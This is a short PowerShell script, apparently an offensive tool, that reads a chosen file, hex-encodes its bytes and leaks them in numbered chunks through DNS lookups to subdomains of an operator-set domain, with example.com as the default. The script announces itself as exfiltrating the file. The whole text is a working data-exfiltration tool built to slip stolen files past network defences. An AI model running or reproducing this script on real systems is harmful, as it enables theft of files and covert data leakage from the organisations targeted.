param(
    [string]$File = "",
    [string]$Domain = "example.com",
    [string]$Subdomain = "subdomain",
    [string]$QueryType = "TXT"
)

# taken from 
# https://stackoverflow.com/questions/48372979/convert-format-hex-powershell-table-to-raw-hex-dump
function ConvertTo-Hex {
    [CmdletBinding()]
    Param(
        [Parameter(
            Position=0,
            Mandatory=$true,
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true
        )]
        [int]$InputObject
    )

    $hex = [char[]]$InputObject |
           ForEach-Object { '{0:x2}' -f [int]$_ }

    if ($hex -ne $null) {
        return (-join $hex)
    }
}

Write-Host "[*] exfiltrating file $File"
$bytes = [System.IO.File]::ReadAllBytes($File);
$hex = New-Object System.Collections.Generic.List[System.Object];

foreach ($b in $bytes)
{
    $h = ConvertTo-Hex $b;
    #echo $b" - "$h;
    $hex.Add($h);
}

Write-Host "[*] hex sample of file: " -NoNewLine
$sample_length = [math]::min( 40, $hex.Count)
for($i=0; $i -le $sample_length; $i++)
{
    Write-Host $hex[$i] -NoNewLine;
}
Write-Host ""

# exfiltrate the file chunk-by-chunk
$exfilLength = 63;
$fileOffset = 0;
$exfilCount = 0;
$continue = $true;
while ($continue)
{
    $exfilString = "$exfilCount-";
    $exfilHexBytes = [math]::Floor(($exfilLength - $exfilString.Length) / 2);

    #Write-Host "offset = $fileOffset, bytes = $exfilHexBytes"
    if($fileOffset + $exfilHexBytes -gt $hex.Count)
    {
        $continue = $false;
        $exfilHexBytes = $hex.Count - $fileOffset;
    }
    $exfilChunk = $hex.GetRange($fileOffset, $exfilHexBytes);
    foreach($c in $exfilChunk)
    {
        $exfilString += $c;
    }
    if($exfilString -ne "$exfilCount-") 
    {
        $DomainToQuery = "$exfilString.$Subdomain.$Domain"
        Write-Host "[*] querying $DomainToQuery"
        Resolve-DnsName -type $QueryType $DomainToQuery -QuickTimeout -erroraction 'silentlycontinue'
    }

    $fileOffset += $exfilHexBytes;
    $exfilCount += 1;
}